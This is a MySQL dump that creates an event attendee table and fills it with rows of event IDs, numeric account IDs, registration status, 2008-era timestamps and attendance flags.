CREATE TABLE IF NOT EXISTS `oit_tbl_event_attendee` (
  `eventId` int(11) NOT NULL DEFAULT '0',
  `accountId` int(10) unsigned NOT NULL DEFAULT '0',
  `status` enum('attending','waitlist','canceled') NOT NULL DEFAULT 'attending',
  `timestamp` int(11) NOT NULL DEFAULT '0',
  `attended` binary(1) NOT NULL DEFAULT '0',
  PRIMARY KEY (`eventId`,`accountId`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

--
-- Dumping data for table `oit_tbl_event_attendee`
--

INSERT INTO `oit_tbl_event_attendee` (`eventId`, `accountId`, `status`, `timestamp`, `attended`) VALUES
(145, 1979, 'attending', 1207759693, '1'),
(145, 1991, 'attending', 1207761264, '1'),
(145, 2055, 'attending', 1207759934, '1'),
(145, 2093, 'waitlist', 1208528164, '0'),
(145, 2118, 'attending', 1207759795, '1'),
(145, 2176, 'attending', 1207760604, '1'),
(145, 2202, 'attending', 1207759334, '1'),
(145, 2234, 'waitlist', 1208379802, '0'),
(145, 2243, 'canceled', 1207764316, '0'),
(145, 2249, 'attending', 1207761471, '1'),
(145, 2306, 'waitlist', 1208542851, '0'),
(145, 2310, 'canceled', 1207764661, '0'),
(145, 2323, 'attending', 1208872546, '1'),
(145, 2325, 'attending', 1208971558, '0'),
(145, 2338, 'waitlist', 1208380268, '0'),
(145, 2358, 'canceled', 1207764035, '0'),
(145, 2407, 'attending', 1207759467, '1'),
(145, 2469, 'attending', 1208531101, '1'),
(145, 2532, 'waitlist', 1207764753, '0'),
(145, 2569, 'waitlist', 1207842373, '0'),
(145, 2639, 'canceled', 1207759481, '\0'),
(145, 2667, 'waitlist', 1208520993, '0'),
(145, 2671, 'attending', 1207761480, '1'),
(145, 2685, 'attending', 1207759820, '1'),
(145, 2692, 'waitlist', 1208524773, '0'),
(145, 2706, 'canceled', 1207831091, '0'),
(145, 2716, 'attending', 1207760256, '1'),
(145, 2724, 'waitlist', 1208517738, '0'),
(145, 2777, 'attending', 1207761329, '1'),
(145, 2847, 'canceled', 1207760258, '0'),
(145, 2849, 'waitlist', 1208793732, '0'),
(145, 2858, 'attending', 1207760939, '1'),
(145, 2884, 'attending', 1207759735, '1'),
(145, 2918, 'canceled', 1207762344, '0'),
(146, 1979, 'attending', 1207759675, '1'),
(146, 1991, 'attending', 1207761273, '1'),
(146, 2055, 'attending', 1207759979, '1'),
(146, 2093, 'attending', 1209502331, '1'),
(146, 2118, 'canceled', 1207760006, '0'),
(146, 2154, 'canceled', 1207766500, '0'),
(146, 2176, 'canceled', 1207760591, '0'),
(146, 2202, 'attending', 1207759376, '1'),
(146, 2234, 'attending', 1207761677, '0'),
(146, 2243, 'canceled', 1207764349, '0'),
(146, 2249, 'attending', 1207761490, '0'),
(146, 2306, 'attending', 1209558894, '0'),
(146, 2310, 'canceled', 1208434433, '0'),
(146, 2323, 'attending', 1208872591, '1'),
(146, 2325, 'canceled', 1208517799, '0'),
(146, 2338, 'canceled', 1207771562, '0'),
(146, 2358, 'canceled', 1208405571, '0'),
(146, 2407, 'canceled', 1207759440, '0'),
(146, 2442, 'waitlist', 1208804728, '0'),
(146, 2469, 'attending', 1207761728, '1'),
(146, 2475, 'canceled', 1207827966, '0'),
(146, 2532, 'canceled', 1208454588, '0'),
(146, 2569, 'canceled', 1208979020, '0'),
(146, 2671, 'attending', 1207761513, '1'),
(146, 2685, 'attending', 1207759769, '1'),
(146, 2692, 'canceled', 1209502194, '0'),
(146, 2706, 'canceled', 1207761546, '0'),
(146, 2716, 'canceled', 1207760290, '0'),
(146, 2724, 'attending', 1209478761, '1'),
(146, 2777, 'attending', 1207761348, '1'),
(146, 2847, 'canceled', 1208894991, '0'),
(146, 2858, 'attending', 1207760857, '1'),
(146, 2884, 'canceled', 1207759788, '0'),
(148, 2294, 'attending', 1207849253, '1'),
(148, 2354, 'attending', 1207849253, '1'),
(148, 2407, 'attending', 1208455590, '1'),
(151, 1985, 'attending', 1210601667, '0'),
(151, 1999, 'attending', 1210961589, '0'),
(151, 2069, 'canceled', 1208465656, '0'),
(151, 2133, 'attending', 1211310005, '0'),
(151, 2144, 'canceled', 1208458074, '0'),
(151, 2154, 'attending', 1208380222, '1'),
(151, 2160, 'canceled', 1211372027, '0'),
(151, 2185, 'attending', 1208458748, '1'),
(151, 2206, 'canceled', 1211228688, '0'),
(151, 2217, 'waitlist', 1211216981, '0'),
(151, 2243, 'attending', 1208379686, '1'),
(151, 2272, 'attending', 1208459849, '1'),
(151, 2310, 'attending', 1211287806, '1'),
(151, 2313, 'attending', 1211376284, '0'),
(151, 2321, 'attending', 1208467249, '1'),
(151, 2336, 'canceled', 1210687334, '0'),
(151, 2338, 'canceled', 1208402861, '0'),
(151, 2358, 'attending', 1208454372, '1'),
(151, 2459, 'waitlist', 1208534477, '0'),
(151, 2475, 'canceled', 1208434421, '0'),
(151, 2532, 'canceled', 1208391632, '0'),
(151, 2569, 'attending', 1208440612, '1'),
(151, 2692, 'waitlist', 1209502390, '0'),
(151, 2706, 'canceled', 1208531156, '0'),
(151, 2723, 'attending', 1208459556, '1'),
(151, 2724, 'waitlist', 1209483777, '0'),
(151, 2831, 'waitlist', 1209472320, '0'),
(151, 2918, 'attending', 1208379789, '1'),
(151, 2926, 'attending', 1208459985, '1'),
(152, 1985, 'attending', 1208469396, '1'),
(152, 1999, 'attending', 1210687346, '0'),
(152, 2069, 'canceled', 1208465686, '0'),
(152, 2144, 'canceled', 1208458049, '0'),
(152, 2154, 'canceled', 1208380237, '0'),
(152, 2160, 'canceled', 1208525798, '0'),
(152, 2185, 'attending', 1208458775, '1'),
(152, 2206, 'attending', 1211310014, '1'),
(152, 2217, 'attending', 1211228695, '1'),
(152, 2243, 'attending', 1208379713, '1'),
(152, 2272, 'attending', 1208459826, '1'),
(152, 2310, 'attending', 1211912025, '1'),
(152, 2313, 'attending', 1211946564, '0'),
(152, 2321, 'attending', 1208467231, '0'),
(152, 2338, 'attending', 1208402766, '1'),
(152, 2358, 'attending', 1208454666, '1'),
(152, 2440, 'attending', 1208467535, '1'),
(152, 2442, 'waitlist', 1208804774, '0'),
(152, 2475, 'canceled', 1208434521, '0'),
(152, 2532, 'canceled', 1208391579, '0'),
(152, 2569, 'attending', 1208440643, '1'),
(152, 2693, 'waitlist', 1208807245, '0'),
(152, 2847, 'canceled', 1208879885, '0'),
(152, 2849, 'waitlist', 1208793752, '0'),
(152, 2884, 'waitlist', 1209478736, '0'),
(152, 2918, 'canceled', 1208379750, '0'),
(152, 2926, 'attending', 1208460071, '1'),
(153, 2325, 'canceled', 1208517462, '0'),
(153, 2354, 'canceled', 1208517544, '0'),
(154, 2294, 'attending', 1208544852, '0'),
(154, 2325, 'attending', 1208544852, '0'),
(154, 2354, 'attending', 1208541775, '0'),
(154, 2847, 'attending', 1208892503, '0'),
(156, 2847, 'attending', 1208894950, '0'),
(157, 1983, 'attending', 1212174852, '1'),
(157, 1991, 'attending', 1212095353, '1'),
(157, 2004, 'attending', 1212179548, '1'),
(157, 2056, 'waitlist', 1212234956, '0'),
(157, 2118, 'attending', 1212168044, '1'),
(157, 2138, 'canceled', 1213023708, '0'),
(157, 2142, 'canceled', 1212176873, '0'),
(157, 2152, 'waitlist', 1212192602, '0'),
(157, 2156, 'attending', 1212165653, '1'),
(157, 2184, 'waitlist', 1212756399, '0'),
(157, 2211, 'waitlist', 1212501864, '0'),
(157, 2212, 'attending', 1212171967, '1'),
(157, 2236, 'attending', 1214405396, '0'),
(157, 2291, 'waitlist', 1213370895, '0'),
(157, 2295, 'attending', 1212164626, '1'),
(157, 2334, 'waitlist', 1213023931, '0'),
(157, 2368, 'attending', 1212112872, '1'),
(157, 2524, 'waitlist', 1212588965, '0'),
(157, 2702, 'attending', 1212165542, '1'),
(157, 2787, 'attending', 1212173650, '1'),
(157, 2811, 'attending', 1212173823, '0'),
(157, 2847, 'canceled', 1212180091, '0'),
(157, 2933, 'canceled', 1214249311, '0'),
(159, 1991, 'attending', 1213031723, '1'),
(159, 1996, 'attending', 1213384772, '1'),
(159, 2055, 'attending', 1213044659, '1'),
(159, 2077, 'attending', 1212605957, '1'),
(159, 2138, 'attending', 1213023746, '1'),
(159, 2202, 'attending', 1212524948, '1'),
(159, 2309, 'attending', 1213131096, '1'),
(159, 2330, 'attending', 1212529290, '1'),
(159, 2338, 'attending', 1212526025, '1'),
(159, 2345, 'attending', 1212584555, '0'),
(159, 2353, 'attending', 1212873729, '1'),
(159, 2368, 'attending', 1213629983, '1'),
(159, 2433, 'attending', 1212525743, '1'),
(159, 2459, 'attending', 1212525204, '1'),
(159, 2642, 'attending', 1213298452, '0'),
(159, 2702, 'attending', 1213033337, '1'),
(159, 2710, 'attending', 1212525485, '1'),
(159, 2809, 'attending', 1212588937, '1'),
(159, 2858, 'attending', 1212530179, '1'),
(160, 2056, 'attending', 1214306870, '1'),
(160, 2138, 'canceled', 1214310494, '0'),
(160, 2268, 'attending', 1214311546, '1'),
(160, 2291, 'attending', 1214831055, '1'),
(160, 2334, 'attending', 1214314503, '1'),
(160, 2353, 'attending', 1214347301, '1'),
(160, 2459, 'canceled', 1214503736, '0'),
(160, 2544, 'attending', 1214503750, '1'),
(160, 2609, 'attending', 1214330279, '1'),
(160, 2659, 'attending', 1214842393, '1'),
(160, 2735, 'attending', 1215696083, '1'),
(160, 2738, 'attending', 1214346781, '1'),
(161, 2018, 'canceled', 1215434269, '0'),
(161, 2055, 'canceled', 1215544919, '0'),
(161, 2117, 'attending', 1216840401, '0'),
(161, 2126, 'attending', 1215431364, '0'),
(161, 2133, 'attending', 1215519903, '0'),
(161, 2138, 'attending', 1216841704, '0'),
(161, 2207, 'attending', 1215094180, '0'),
(161, 2216, 'attending', 1215094416, '0'),
(161, 2248, 'attending', 1215806096, '0'),
(161, 2282, 'attending', 1216725145, '0'),
(161, 2313, 'attending', 1215095590, '0'),
(161, 2345, 'attending', 1215094235, '0'),
(161, 2365, 'attending', 1215098959, '0'),
(161, 2403, 'attending', 1216139885, '0'),
(161, 2409, 'attending', 1216483756, '0'),
(161, 2430, 'attending', 1215456460, '0'),
(161, 2432, 'attending', 1215531931, '0'),
(161, 2458, 'attending', 1215448749, '0'),
(161, 2459, 'attending', 1215098127, '0'),
(161, 2559, 'attending', 1216406537, '0'),
(161, 2575, 'attending', 1215433319, '0'),
(161, 2578, 'attending', 1215443536, '0'),
(161, 2639, 'attending', 1216725010, '0'),
(161, 2720, 'attending', 1216412051, '0'),
(161, 2735, 'attending', 1215432757, '0'),
(161, 2768, 'attending', 1215113598, '0'),
(161, 2790, 'attending', 1215100969, '0'),
(162, 1979, 'attending', 1215099039, '0'),
(162, 2055, 'attending', 1216820889, '0'),
(162, 2068, 'attending', 1215094330, '0'),
(162, 2077, 'attending', 1217261274, '0'),
(162, 2093, 'attending', 1217255312, '0'),
(162, 2119, 'attending', 1215435729, '0'),
(162, 2202, 'attending', 1215094287, '0'),
(162, 2214, 'attending', 1215450264, '0'),
(162, 2268, 'attending', 1216673389, '0'),
(162, 2298, 'attending', 1217019425, '0'),
(162, 2334, 'attending', 1216673295, '0'),
(162, 2353, 'canceled', 1215438032, '0'),
(162, 2390, 'attending', 1217252421, '0'),
(162, 2544, 'attending', 1215122102, '0'),
(162, 2547, 'attending', 1217261421, '0'),
(162, 2579, 'attending', 1217253807, '0'),
(162, 2697, 'attending', 1215100618, '0'),
(162, 2701, 'attending', 1217005834, '0'),
(162, 2706, 'attending', 1216763592, '0'),
(162, 2714, 'attending', 1216766558, '0'),
(162, 2716, 'attending', 1215097196, '0'),
(162, 2787, 'canceled', 1216521268, '0'),
(162, 2852, 'attending', 1217248828, '0'),
(163, 2390, 'attending', 1216144861, '1'),
(163, 2701, 'attending', 1216746842, '1'),
(163, 2706, 'attending', 1216763252, '1'),
(163, 2847, 'attending', 1216133204, '0'),
(164, 1988, 'attending', 1218122015, '1'),
(164, 1996, 'attending', 1218052948, '1'),
(164, 1998, 'canceled', 1218468460, '0'),
(164, 2032, 'attending', 1218052768, '1'),
(164, 2035, 'attending', 1218113103, '1'),
(164, 2055, 'attending', 1218052030, '1'),
(164, 2070, 'attending', 1218546897, '1'),
(164, 2071, 'attending', 1218543856, '1'),
(164, 2114, 'attending', 1218106507, '1'),
(164, 2130, 'attending', 1218570919, '1'),
(164, 2154, 'attending', 1218469630, '1'),
(164, 2165, 'attending', 1218056500, '1'),
(164, 2172, 'attending', 1218148134, '1'),
(164, 2179, 'attending', 1218482417, '1'),
(164, 2183, 'canceled', 1218118404, '0'),
(164, 2191, 'attending', 1218546991, '1'),
(164, 2206, 'attending', 1218546968, '1'),
(164, 2217, 'attending', 1218218502, '1'),
(164, 2219, 'attending', 1218053027, '1'),
(164, 2227, 'attending', 1218482120, '1'),
(164, 2233, 'canceled', 1218053617, '0'),
(164, 2234, 'attending', 1218540346, '1'),
(164, 2245, 'attending', 1218562515, '1'),
(164, 2257, 'attending', 1218136906, '1'),
(164, 2261, 'attending', 1218569254, '1'),
(164, 2283, 'attending', 1218562228, '1'),
(164, 2294, 'attending', 1218111477, '1'),
(164, 2319, 'attending', 1218052495, '1'),
(164, 2326, 'attending', 1218136912, '1'),
(164, 2354, 'attending', 1218052258, '1'),
(164, 2360, 'attending', 1218560372, '1'),
(164, 2376, 'attending', 1218051965, '1'),
(164, 2407, 'attending', 1218054746, '1'),
(164, 2410, 'attending', 1218483142, '1'),
(164, 2422, 'attending', 1218222998, '1'),
(164, 2423, 'attending', 1218555534, '1'),
(164, 2434, 'attending', 1218112524, '1'),
(164, 2446, 'attending', 1218228541, '1'),
(164, 2447, 'canceled', 1218197798, '0'),
(164, 2455, 'attending', 1218110135, '1'),
(164, 2470, 'attending', 1218053304, '0'),
(164, 2474, 'attending', 1218053277, '1'),
(164, 2516, 'attending', 1218561874, '1'),
(164, 2543, 'attending', 1218054718, '1'),
(164, 2552, 'attending', 1218556539, '1'),
(164, 2598, 'attending', 1218220726, '1'),
(164, 2618, 'attending', 1218130154, '1'),
(164, 2628, 'attending', 1218559657, '1'),
(164, 2638, 'attending', 1218569603, '1'),
(164, 2642, 'attending', 1218052740, '1'),
(164, 2643, 'attending', 1218063372, '1'),
(164, 2649, 'attending', 1218541030, '1'),
(164, 2684, 'attending', 1218052025, '1'),
(164, 2713, 'attending', 1218195139, '1'),
(164, 2715, 'canceled', 1218221276, '0'),
(164, 2726, 'attending', 1218081315, '1'),
(164, 2728, 'attending', 1218053029, '1'),
(164, 2748, 'attending', 1218570173, '1'),
(164, 2756, 'attending', 1218569489, '1'),
(164, 2806, 'attending', 1218053195, '1'),
(164, 2821, 'attending', 1218424764, '1'),
(164, 2828, 'attending', 1218200249, '1'),
(164, 2835, 'attending', 1218482263, '1'),
(164, 2837, 'attending', 1218052371, '1'),
(164, 2847, 'attending', 1218049045, '1'),
(164, 2855, 'canceled', 1218055284, '0'),
(164, 2859, 'attending', 1218053398, '1'),
(164, 2860, 'attending', 1218201213, '1'),
(164, 2867, 'attending', 1218064198, '1'),
(164, 2889, 'attending', 1218052563, '1'),
(164, 2899, 'attending', 1218485887, '1'),
(164, 2908, 'attending', 1218569696, '1'),
(164, 2912, 'attending', 1218054609, '1'),
(164, 2922, 'attending', 1218229545, '1'),
(164, 2924, 'attending', 1218464798, '1'),
(165, 1982, 'canceled', 1218555949, '0'),
(165, 2006, 'attending', 1218564735, '1'),
(165, 2019, 'attending', 1218561890, '1'),
(165, 2024, 'attending', 1218556791, '1'),
(165, 2070, 'canceled', 1218107902, '0'),
(165, 2085, 'attending', 1218052366, '1'),
(165, 2102, 'attending', 1218730266, '1'),
(165, 2103, 'attending', 1218560265, '1'),
(165, 2129, 'attending', 1218631760, '1'),
(165, 2144, 'attending', 1218317018, '1'),
(165, 2146, 'attending', 1218052465, '1'),
(165, 2162, 'attending', 1218079673, '1'),
(165, 2183, 'attending', 1218118500, '1'),
(165, 2185, 'attending', 1218559791, '1'),
(165, 2195, 'attending', 1218245600, '1'),
(165, 2214, 'attending', 1218594994, '1'),
(165, 2221, 'attending', 1218548066, '1'),
(165, 2293, 'attending', 1218206370, '1'),
(165, 2323, 'canceled', 1218551432, '0'),
(165, 2349, 'attending', 1218475330, '1'),
(165, 2356, 'attending', 1218586004, '1'),
(165, 2383, 'attending', 1218563186, '1'),
(165, 2385, 'attending', 1218173228, '0'),
(165, 2405, 'attending', 1218052711, '1'),
(165, 2408, 'attending', 1218628170, '1'),
(165, 2437, 'attending', 1218052328, '1'),
(165, 2443, 'attending', 1218640670, '1'),
(165, 2447, 'attending', 1218550970, '1'),
(165, 2462, 'attending', 1218052968, '1'),
(165, 2464, 'attending', 1218115311, '1'),
(165, 2470, 'attending', 1218565881, '1'),
(165, 2543, 'attending', 1218570673, '0'),
(165, 2556, 'attending', 1218556977, '1'),
(165, 2562, 'attending', 1218578643, '1'),
(165, 2567, 'attending', 1218547460, '1'),
(165, 2582, 'attending', 1218121045, '1'),
(165, 2588, 'attending', 1218223747, '1'),
(165, 2612, 'attending', 1218636330, '1'),
(165, 2620, 'attending', 1218115439, '1'),
(165, 2624, 'attending', 1218055563, '1'),
(165, 2654, 'attending', 1218564348, '1'),
(165, 2661, 'attending', 1218565012, '0'),
(165, 2679, 'attending', 1218577074, '1'),
(165, 2680, 'attending', 1218121875, '1'),
(165, 2683, 'attending', 1218109075, '1'),
(165, 2691, 'attending', 1218053449, '1'),
(165, 2701, 'attending', 1218630573, '1'),
(165, 2712, 'attending', 1218203967, '1'),
(165, 2729, 'canceled', 1218052599, '0'),
(165, 2742, 'attending', 1218112131, '1'),
(165, 2748, 'canceled', 1218048854, '0'),
(165, 2783, 'attending', 1218564083, '1'),
(165, 2796, 'attending', 1218213073, '1'),
(165, 2818, 'attending', 1218053132, '1'),
(165, 2836, 'attending', 1218199396, '1'),
(165, 2842, 'attending', 1218461302, '1'),
(165, 2850, 'attending', 1218058291, '1'),
(165, 2855, 'canceled', 1218560468, '0'),
(165, 2862, 'attending', 1218546102, '1'),
(165, 2864, 'attending', 1218111508, '1'),
(165, 2884, 'attending', 1218052234, '1'),
(165, 2901, 'attending', 1218582007, '1'),
(165, 2910, 'attending', 1218113718, '1'),
(165, 2919, 'attending', 1218053696, '1'),
(165, 2934, 'attending', 1218636291, '1'),
(166, 1980, 'attending', 1218641964, '1'),
(166, 1982, 'attending', 1218571149, '1'),
(166, 1992, 'attending', 1218218868, '1'),
(166, 1998, 'attending', 1218561037, '1'),
(166, 1999, 'attending', 1218052853, '1'),
(166, 2001, 'attending', 1218135832, '1'),
(166, 2021, 'attending', 1218214904, '1'),
(166, 2023, 'attending', 1218171236, '1'),
(166, 2046, 'attending', 1218649017, '1'),
(166, 2050, 'attending', 1218052432, '1'),
(166, 2059, 'attending', 1218639983, '1'),
(166, 2063, 'attending', 1218641172, '1'),
(166, 2076, 'attending', 1218481722, '1'),
(166, 2079, 'attending', 1218111608, '1'),
(166, 2101, 'attending', 1218110366, '1'),
(166, 2120, 'attending', 1218052545, '1'),
(166, 2133, 'attending', 1218053858, '1'),
(166, 2186, 'attending', 1218109909, '1'),
(166, 2191, 'canceled', 1218545765, '0'),
(166, 2198, 'attending', 1218052975, '1'),
(166, 2199, 'attending', 1218726749, '1'),
(166, 2207, 'attending', 1218563180, '1'),
(166, 2211, 'attending', 1218108384, '1'),
(166, 2233, 'attending', 1218053859, '1'),
(166, 2249, 'attending', 1218113675, '1'),
(166, 2252, 'attending', 1218717586, '1'),
(166, 2260, 'attending', 1218713635, '1'),
(166, 2265, 'attending', 1218053967, '1'),
(166, 2270, 'attending', 1218214825, '1'),
(166, 2271, 'attending', 1218726749, '1'),
(166, 2280, 'attending', 1218117847, '1'),
(166, 2285, 'attending', 1218121715, '1'),
(166, 2286, 'attending', 1218053650, '1'),
(166, 2288, 'attending', 1218568382, '1'),
(166, 2292, 'attending', 1218638637, '1'),
(166, 2299, 'attending', 1218727131, '1'),
(166, 2301, 'attending', 1218056925, '1'),
(166, 2304, 'attending', 1218053731, '1'),
(166, 2313, 'attending', 1218466097, '1'),
(166, 2323, 'attending', 1218572277, '0'),
(166, 2336, 'attending', 1218054181, '0'),
(166, 2338, 'attending', 1218726685, '1'),
(166, 2355, 'attending', 1218214855, '1'),
(166, 2358, 'attending', 1218630915, '1'),
(166, 2372, 'attending', 1218122717, '1'),
(166, 2375, 'attending', 1218727669, '1'),
(166, 2385, 'attending', 1218726617, '1'),
(166, 2433, 'attending', 1218629305, '1'),
(166, 2436, 'attending', 1218510235, '1'),
(166, 2453, 'attending', 1218135272, '1'),
(166, 2460, 'attending', 1218055945, '1'),
(166, 2465, 'attending', 1218134329, '1'),
(166, 2473, 'attending', 1218555962, '1'),
(166, 2476, 'attending', 1218577636, '1'),
(166, 2489, 'attending', 1218218848, '1'),
(166, 2493, 'attending', 1218726559, '1'),
(166, 2496, 'attending', 1218726637, '1'),
(166, 2503, 'attending', 1218627247, '1'),
(166, 2507, 'attending', 1218053917, '1'),
(166, 2509, 'attending', 1218113156, '0'),
(166, 2539, 'attending', 1218054230, '1'),
(166, 2545, 'attending', 1218052086, '1'),
(166, 2546, 'attending', 1218481213, '1'),
(166, 2553, 'attending', 1218627734, '1'),
(166, 2561, 'attending', 1218550060, '1'),
(166, 2601, 'attending', 1218052615, '1'),
(166, 2604, 'attending', 1218052244, '1'),
(166, 2612, 'canceled', 1218550908, '0'),
(166, 2633, 'attending', 1218637866, '1'),
(166, 2650, 'attending', 1218053378, '1'),
(166, 2661, 'attending', 1218726654, '1'),
(166, 2689, 'attending', 1218726492, '1'),
(166, 2695, 'attending', 1218636793, '1'),
(166, 2704, 'attending', 1218052645, '1'),
(166, 2705, 'attending', 1218054738, '1'),
(166, 2711, 'attending', 1218199380, '1'),
(166, 2715, 'attending', 1218474727, '1'),
(166, 2717, 'attending', 1218135995, '1'),
(166, 2718, 'attending', 1218636606, '1'),
(166, 2725, 'attending', 1218052170, '1'),
(166, 2729, 'attending', 1218628947, '1'),
(166, 2742, 'canceled', 1218111433, '0'),
(166, 2746, 'attending', 1218630068, '1'),
(166, 2748, 'canceled', 1218049357, '0'),
(166, 2765, 'attending', 1218111034, '1'),
(166, 2771, 'attending', 1218115341, '1'),
(166, 2775, 'attending', 1218727266, '1'),
(166, 2803, 'attending', 1218402155, '1'),
(166, 2817, 'attending', 1218167273, '1'),
(166, 2819, 'attending', 1218570607, '0'),
(166, 2824, 'attending', 1218662416, '1'),
(166, 2830, 'attending', 1218053915, '1'),
(166, 2831, 'attending', 1218053503, '1'),
(166, 2834, 'attending', 1218651989, '1'),
(166, 2852, 'attending', 1218713630, '1'),
(166, 2855, 'attending', 1218637214, '1'),
(166, 2858, 'attending', 1218460984, '1'),
(166, 2861, 'attending', 1218562315, '1'),
(166, 2869, 'attending', 1218054878, '1'),
(166, 2872, 'attending', 1218665256, '0'),
(166, 2878, 'attending', 1218142303, '1'),
(166, 2880, 'attending', 1218628370, '1'),
(166, 2896, 'attending', 1218726674, '1'),
(166, 2900, 'attending', 1218675319, '0'),
(166, 2901, 'canceled', 1218582025, '0'),
(166, 2903, 'attending', 1218714101, '1'),
(166, 2906, 'attending', 1218641835, '1'),
(166, 2907, 'attending', 1218052238, '1'),
(166, 2913, 'attending', 1218661549, '1'),
(166, 2916, 'attending', 1218645410, '1'),
(166, 2925, 'attending', 1218633542, '1'),
(166, 2941, 'attending', 1218652721, '1'),
(167, 2058, 'canceled', 1218545063, '0'),
(167, 2088, 'canceled', 1219432291, '0'),
(167, 2092, 'canceled', 1218636263, '0'),
(167, 2121, 'canceled', 1218052250, '0'),
(167, 2127, 'canceled', 1218116176, '0'),
(167, 2129, 'canceled', 1218483201, '0'),
(167, 2154, 'canceled', 1218054220, '0'),
(167, 2218, 'canceled', 1218717139, '0'),
(167, 2246, 'canceled', 1218139955, '0'),
(167, 2278, 'canceled', 1219351347, '0'),
(167, 2297, 'canceled', 1218053807, '0'),
(167, 2300, 'canceled', 1218642251, '0'),
(167, 2309, 'canceled', 1218473707, '0'),
(167, 2323, 'canceled', 1219327011, '0'),
(167, 2330, 'canceled', 1218052480, '0'),
(167, 2336, 'canceled', 1218728949, '0'),
(167, 2441, 'canceled', 1218895877, '0'),
(167, 2458, 'canceled', 1218139057, '0'),
(167, 2509, 'canceled', 1218727298, '0'),
(167, 2584, 'canceled', 1218552147, '0'),
(167, 2741, 'canceled', 1219667438, '0'),
(167, 2872, 'canceled', 1218719602, '0'),
(167, 2880, 'canceled', 1219174581, '0'),
(167, 2900, 'canceled', 1218733751, '0'),
(168, 2093, 'attending', 1220622887, '1'),
(168, 2272, 'attending', 1220478076, '0'),
(168, 2320, 'canceled', 1220612745, '0'),
(168, 2415, 'attending', 1220646706, '1'),
(168, 2583, 'attending', 1220535429, '1'),
(168, 2611, 'attending', 1220715108, '1'),
(168, 2719, 'attending', 1220495811, '0'),
(168, 2840, 'attending', 1220531938, '1'),
(168, 2876, 'attending', 1220496051, '1'),
(168, 2884, 'attending', 1220880964, '1'),
(168, 2915, 'attending', 1220482712, '1'),
(169, 2025, 'attending', 1220889429, '1'),
(169, 2042, 'attending', 1220530655, '1'),
(169, 2129, 'canceled', 1220540110, '0'),
(169, 2429, 'attending', 1220484576, '1'),
(169, 2469, 'attending', 1220495317, '0'),
(169, 2610, 'attending', 1220496438, '1'),
(169, 2667, 'canceled', 1220897111, '0'),
(169, 2677, 'attending', 1220889645, '1'),
(169, 2690, 'attending', 1220496306, '1'),
(169, 2875, 'attending', 1220502746, '1'),
(170, 2839, 'attending', 1220989898, '1'),
(170, 2873, 'canceled', 1220644298, '0'),
(170, 2884, 'canceled', 1220880467, '0'),
(171, 2213, 'attending', 1220547737, '1'),
(171, 2309, 'attending', 1220879984, '0'),
(171, 2320, 'attending', 1220612929, '1'),
(171, 2652, 'attending', 1220478187, '1'),
(171, 2667, 'attending', 1220897193, '1'),
(171, 2937, 'attending', 1221076158, '1'),
(172, 1987, 'attending', 1220556756, '0'),
(172, 2026, 'attending', 1220462735, '0'),
(172, 2092, 'attending', 1220035725, '0'),
(172, 2121, 'attending', 1220036711, '0'),
(172, 2127, 'attending', 1220377341, '0'),
(172, 2135, 'attending', 1220036729, '0'),
(172, 2151, 'attending', 1220448681, '0'),
(172, 2246, 'attending', 1220037510, '0'),
(172, 2311, 'attending', 1220120010, '0'),
(172, 2323, 'attending', 1220384661, '0'),
(172, 2330, 'attending', 1220452119, '0'),
(172, 2458, 'attending', 1220355435, '0'),
(172, 2481, 'attending', 1220356846, '0'),
(172, 2581, 'attending', 1220478212, '0'),
(172, 2621, 'attending', 1220359860, '0'),
(172, 2622, 'attending', 1220381952, '0'),
(172, 2660, 'attending', 1220356594, '0'),
(172, 2749, 'attending', 1220037652, '0'),
(172, 2762, 'canceled', 1220474791, '0'),
(172, 2763, 'attending', 1220036745, '0'),
(172, 2781, 'attending', 1220036052, '0'),
(172, 2838, 'attending', 1220038992, '0'),
(172, 2900, 'attending', 1220036295, '0'),
(173, 2134, 'attending', 1220359401, '0'),
(173, 2194, 'attending', 1220361078, '0'),
(173, 2278, 'attending', 1220355374, '0'),
(173, 2297, 'attending', 1220542082, '0'),
(173, 2300, 'attending', 1220035899, '0'),
(173, 2441, 'attending', 1220038495, '0'),
(173, 2469, 'attending', 1220494891, '0'),
(173, 2584, 'attending', 1220373012, '0'),
(173, 2829, 'attending', 1220545679, '0'),
(174, 1988, 'attending', 1220885964, '1'),
(174, 2114, 'attending', 1222886062, '1'),
(174, 2286, 'attending', 1220879315, '1'),
(174, 2309, 'attending', 1220879611, '1'),
(174, 2375, 'attending', 1222886061, '1'),
(174, 2436, 'attending', 1220879610, '1'),
(174, 2481, 'attending', 1220628169, '1'),
(174, 2496, 'attending', 1220880451, '1'),
(174, 2539, 'attending', 1220560724, '1'),
(174, 2581, 'attending', 1222886061, '1'),
(174, 2582, 'attending', 1220888077, '0'),
(174, 2679, 'attending', 1222886061, '1'),
(174, 2859, 'attending', 1220879914, '1'),
(174, 2884, 'attending', 1220880262, '0'),
(174, 2889, 'attending', 1222886061, '1'),
(174, 2916, 'attending', 1220888867, '1'),
(175, 1980, 'attending', 1222800135, '1'),
(175, 1988, 'attending', 1222775299, '1'),
(175, 2001, 'attending', 1222883759, '1'),
(175, 2059, 'attending', 1222883879, '1'),
(175, 2185, 'attending', 1222780865, '1'),
(175, 2285, 'attending', 1220041357, '1'),
(175, 2286, 'attending', 1220879395, '1'),
(175, 2319, 'attending', 1222787288, '1'),
(175, 2375, 'attending', 1222775562, '1'),
(175, 2503, 'attending', 1222774176, '0'),
(175, 2552, 'attending', 1222719842, '0'),
(175, 2652, 'attending', 1220881655, '0'),
(175, 2654, 'attending', 1222873900, '1'),
(175, 2679, 'attending', 1222883842, '1'),
(175, 2683, 'attending', 1222883929, '1'),
(175, 2691, 'attending', 1222883758, '1'),
(175, 2726, 'attending', 1221612147, '1'),
(175, 2745, 'attending', 1222785776, '1'),
(175, 2783, 'attending', 1222800949, '1'),
(175, 2817, 'canceled', 1220468549, '0'),
(175, 2850, 'attending', 1222866603, '0'),
(175, 2884, 'attending', 1222722008, '0'),
(175, 2906, 'attending', 1222719738, '1'),
(175, 2934, 'attending', 1222883929, '1'),
(178, 1996, 'attending', 1221173883, '0'),
(178, 2093, 'attending', 1220987928, '0'),
(178, 2310, 'attending', 1221673053, '0'),
(178, 2415, 'attending', 1220988958, '0'),
(178, 2444, 'attending', 1220496632, '0'),
(178, 2469, 'attending', 1220495004, '0'),
(178, 2583, 'canceled', 1220969469, '0'),
(178, 2667, 'attending', 1221594448, '0'),
(178, 2743, 'attending', 1220991015, '0'),
(178, 2777, 'attending', 1221673553, '0'),
(178, 2839, 'attending', 1220989143, '0'),
(178, 2873, 'attending', 1220644336, '0'),
